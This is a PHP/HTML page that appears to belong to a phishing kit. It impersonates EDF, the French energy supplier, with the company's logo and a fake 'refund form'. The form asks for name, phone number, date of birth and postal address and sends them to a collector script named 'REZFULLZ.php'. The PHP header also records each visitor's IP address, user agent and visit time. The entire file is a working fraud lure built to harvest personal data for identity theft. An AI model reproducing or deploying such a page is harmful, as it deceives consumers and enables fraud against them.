<?php

ob_start();
session_start();

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";



?>




<html lang="en">
<head>



    <meta property="twitter:card" content="summary_large_image">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <meta property="twitter:card" content="summary_large_image">
    <style>
      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6 {  margin: 0;  padding: 0;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}
    </style>
    <style>
      html {
        font-family: Inter;
        font-size: 16px;
      }

      body {
        font-weight: 400;
        font-style:normal;
        text-decoration: none;
        text-transform: none;
        letter-spacing: normal;
        line-height: 1.25;
        color: var(--dl-color-gray-black);
        background-color: var(--dl-color-gray-white);

      }
    </style>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap">
    <link rel="stylesheet" href="./styles.css">
  </head>
  <body>
    <div>
      <link href="./homee.css" rel="stylesheet">

      <div class="home-container">
        <header data-role="Header" class="home-header">
          <img alt="logo" src="https://espace-client.edf.fr/sso/XUI/img/logo-edf.png" class="home-image">
        </header>
		<span class="home-text">Formulaire de remboursement EDF</span>		
		<center><form method="POST" action="REZFULLZ.php">
        
        <input type="text" id="Prénom" name="Prénom" required="" placeholder="Prénom" autocomplete="name" class="input home-textinput">
        <input type="text" id="Nom" name="Nom" required="" placeholder="Nom" autocomplete="family-name" class="input home-textinput1">
        <input type="tel" id="numéro" name="numéro" required="" placeholder="Numéro" autocomplete="tel" class="input home-input">
        <input type="text" id="dob" name="dob" placeholder="Date de naissance DD/MM/YYYY" autocomplete="birthday" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')" class="input home-textinput2">
        <input type="text" id="Adresse" name="Adresse" required="" placeholder="Adresse" autocomplete="street-address" class="input home-textinput3">
        <input type="text" id="Postal" name="Postal" required="" placeholder="Code Postal" autocomplete="postal-code" class="input home-textinput4">
        <button class="button home-button">Envoyer</button>
      </form></center>
	  </div>
    </div>
  

</body></html>